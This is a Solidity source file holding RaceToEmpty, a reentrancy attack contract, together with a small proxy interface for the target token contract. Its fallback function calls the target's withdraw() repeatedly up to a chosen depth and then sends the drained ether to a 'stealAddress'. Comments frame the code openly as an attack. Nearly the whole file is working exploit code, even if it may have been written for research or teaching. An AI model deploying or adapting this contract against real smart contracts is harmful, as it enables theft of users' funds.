/* The proxy contract is required to declare an interface
   that RaceToEmpty understands */
contract TWIProxy {
  mapping(address => uint) public balanceOf;
  uint public totalSupply;

  function withdraw() {
  }

}


/*
 * This contract is used in conjunction with PrepWithdraws.
 * The target of PrepWithdraws should be this contract.
 * Once "start" has been called on PrepWithDraws call this
 * contract in order to withdraw that many times
 * a get the ether value equal to the total number of tokens
 * withdrawn.
 */
contract RaceToEmpty {
  event Log(string msg, uint value);
  /* It is important that performAttack is initially false so
   * that we can give ether to this contract to deposit into
   * TokenWithInvariants contract without invoking logic of
   * the default function
   */
  bool performAttack = false;
  uint8 depth = 0;
  uint numExtraWithdraws;
  /* Fill in with address of TokenWithInvariants contract */
  TWIProxy twi;
  address stealAddress;

  /* Constructor */
  function RaceToEmpty(address _twiAddress, address _stealAddress,
                         uint _numExtraWithdraws) {
    twi = TWIProxy(_twiAddress);
    stealAddress = _stealAddress;
    numExtraWithdraws   = _numExtraWithdraws;
  }

  /* Default function. Always run */
  function() {
    if (performAttack) {
      depth = depth + 1;
      if (depth <= numExtraWithdraws) {  /* attack again */
        Log("Extra withdraw number ", depth);
        twi.withdraw();
      } else {
        Log("Finished", 0);
        /* Send all value to stealAddress */
        stealAddress.call.value(this.balance)();
        performAttack = false; /* turn off attack again*/
      }
    }
  }

  function reset() {
    performAttack = false;
  }

  function start() {
    depth = 0;
    performAttack = true;
    Log("First withdraw. Tokens = ", twi.balanceOf(this));
    twi.withdraw();
  }

}